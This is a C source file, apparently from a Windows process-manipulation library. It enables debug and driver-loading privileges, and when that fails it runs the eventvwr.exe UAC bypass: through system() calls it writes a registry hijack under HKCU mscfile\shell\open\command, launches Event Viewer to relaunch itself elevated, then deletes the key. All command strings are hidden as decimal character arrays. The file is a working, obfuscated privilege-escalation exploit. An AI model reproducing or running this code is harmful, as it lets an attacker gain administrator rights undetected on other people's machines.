#include "REM.h"
#include "typedefs.h"
#include <stdlib.h>
#include <string.h>

void
REM_UCombineStringA(char* adr, const char* src);

NTSTATUS
RtlAdjustPrivilege(uint32_t Privilege, uint8_t Enable, uint8_t CurrentThread, uint8_t* Enabled);

static
uint8_t REM_USYSTEM()
{
	uint8_t result = 0;
	{
		char USERNAME_STR[] = { 85,83,69,82,78,65,77,69,0 };
		char SYSTEM_STR[] = { 83,89,83,84,69,77,0 };

		char* userName;
		if (_dupenv_s(&userName, NULL, USERNAME_STR) == 0 && userName > NULL)
		{
			if (!_strcmpi(userName, SYSTEM_STR))
			{
				result = 1;
			}
			free(userName);
		}
	}
	return result;
}

static
uint8_t REM_UGetPrivs()
{
	/* SeLoadDriverPrivilege & DebugPrivs */
	uint8_t privs_status = 0;
	{
		uint8_t rtl_privs;
		if (!REM_USYSTEM())
		{
			NTSTATUS status = RtlAdjustPrivilege(10, 1, 0, &rtl_privs);

			if (NT_SUCCESS(status))
			{
				if (NT_SUCCESS(RtlAdjustPrivilege(20, 1, 0, &rtl_privs)))
				{
					privs_status = 1;
				}
			}
		}
		else
		{
			/*those are without check because login system account returns error probably because it has these already*/
			RtlAdjustPrivilege(10, 1, 0, &rtl_privs);
			RtlAdjustPrivilege(20, 1, 0, &rtl_privs);
			privs_status = 1;
		}
	}
	return privs_status;
}

uint8_t REM_UGetDebugPrivs()
{
	static uint8_t status = 0;
	if (!status)
	{
		status = REM_UGetPrivs();
	}

	if (!status)
	{
		char reg_add_full[260] = { 0 };
		{
			REM_PROCESS* current_process = REM_AttachToProcess(NULL);
			if (current_process > NULL)
			{

				REM_MODULE *current_module = REM_AttachToModule(current_process, NULL);
				if (current_module > NULL)
				{
					char base_path[260] = { 0 };
					{
						const char* basepath = REM_GetBasePath(current_module);
						memcpy(base_path, basepath, strlen(basepath) * sizeof(char));
					}

					size_t prog_lenght = strlen(base_path);
					for (int i = 0; i < 4; i++)
					{
						base_path[prog_lenght + i] = 34;
					}

					char reg_add_str[] =
					{
						82, 69, 71, 32, 65, 68, 68, 32, 72, 75, 67, 85, 92, 83, 111, 102, 116, 119, 97, 114, 101, 92, 67, 108, 97,
						115, 115, 101, 115, 92, 109, 115, 99, 102, 105, 108, 101, 92, 115, 104, 101, 108, 108, 92, 111, 112,
						101, 110, 92, 99, 111, 109, 109, 97, 110, 100, 32, 47, 118, 101, 32, 47, 100, 32, 34, 99, 109, 100,
						46, 101, 120, 101, 32, 47, 99, 32, 115, 116, 97, 114, 116, 32, 34, 34, 34, 34, 34, 34, 32, 34, 34, 34, 0
					};
					REM_UCombineStringA(reg_add_full, reg_add_str);
					REM_UCombineStringA(reg_add_full, base_path);
					REM_DetachModule(current_module);
				}
				REM_DetachProcess(current_process);
			}
		}

		char timeout_str[] = { 116,105,109,101,111,117,116,32,47,116,32,48,0 };

		char start_eventvwr_str[] =
		{
			115,116,97,114,116,32,37,87,73,78,68,73,82,37,92,83,121,115,116,101,109,51,50,92
			,101,118,101,110,116,118,119,114,46,101,120,101,0
		};

		char reg_delete_str[] =
		{
			82,69,71,32,68,69,76,69,84,69,32,72,75,67,85,92,83,111,102,116,119,97,114,101,92,
			67,108,97,115,115,101,115,92,109,115,99,102,105,108,101,92,115,104,101,108,108,
			92,111,112,101,110,92,99,111,109,109,97,110,100,32,47,102,0
		};


		system(reg_add_full);
		system(timeout_str);
		system(start_eventvwr_str);
		system(timeout_str);
		system(reg_delete_str);

	}
	return status;
}